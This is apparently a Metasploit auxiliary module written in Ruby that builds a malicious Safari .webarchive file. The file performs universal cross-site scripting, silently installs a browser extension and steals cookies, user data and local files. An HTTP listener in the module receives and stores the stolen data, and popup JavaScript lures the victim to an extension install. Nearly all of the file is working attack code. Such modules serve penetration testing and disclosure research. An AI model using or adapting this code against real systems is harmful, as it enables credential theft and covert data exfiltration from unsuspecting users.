##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/format/webarchive'
require 'uri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::Format::Webarchive
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Mac OS X Safari .webarchive File Format UXSS',
      'Description'    => %q{
        Generates a .webarchive file for Mac OS X Safari that will attempt to
        inject cross-domain Javascript (UXSS), silently install a browser
        extension, collect user information, steal the cookie database,
        and steal arbitrary local files.

        When opened on the target machine the webarchive file must not have the
        quarantine attribute set, as this forces the webarchive to execute in a
        sandbox.
      },
      'License'        => MSF_LICENSE,
      'Author'         => 'joev',
      'References'     =>
        [
          ['URL', 'https://blog.rapid7.com/2013/04/25/abusing-safaris-webarchive-file-format']
        ],
      'DisclosureDate' => 'Feb 22 2013',
      'Actions'        => [ [ 'WebServer' ] ],
      'PassiveActions' => [ 'WebServer' ],
      'DefaultAction'  => 'WebServer'))
  end

  def run
    if datastore["URIPATH"].blank?
      datastore["URIPATH"] = "/" + Rex::Text.rand_text_alphanumeric(rand(10) + 6)
    end

    print_status("Creating '#{datastore['FILENAME']}' file...")
    file_create(webarchive_xml)
    exploit
  end

  def on_request_uri(cli, request)
    if request.method =~ /post/i
      data_str = request.body.to_s
      begin
        data = JSON::parse(data_str || '')
        file = record_data(data, cli)
        send_response_html(cli, '')
        print_good "#{data_str.length} chars received and stored to #{file}"
      rescue JSON::ParserError => e # json error, dismiss request & keep crit. server up
        file = record_data(data_str, cli)
        print_error "Invalid JSON stored in #{file}"
        send_response_html(cli, '')
      end
    else
      send_response(cli, webarchive_xml, {
        'Content-Type' => 'application/x-webarchive',
        'Content-Disposition' => "attachment; filename=\"#{datastore['FILENAME']}\""
      })
    end
  end

  # @param [Hash] data the data to store in the log
  # @return [String] filename where we are storing the data
  def record_data(data, cli)
    if data.is_a? Hash
      file = File.basename(data.keys.first).gsub(/[^A-Za-z]/,'')
    end
    store_loot(
      file || "data", "text/plain", cli.peerhost, data, "safari_webarchive", "Webarchive Collected Data"
    )
  end

  # @return [String] formatted http/https URL of the listener
  def backend_url
    proto = (datastore["SSL"] ? "https" : "http")
    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
    "#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH']}/catch"
  end

  def message
    super + (datastore['INSTALL_EXTENSION'] ? " <a href='javascript:void(0)'>Click here to continue.</a>" + popup_js : '')
  end

  def popup_js
    wrap_with_script do
      %Q|
        window.onclick = function() {
          window.open('data:text/html,<script>opener.postMessage("EXT", "*");window.location="#{apple_extension_url}";<\\/script>');
        };
      |
    end
  end


end
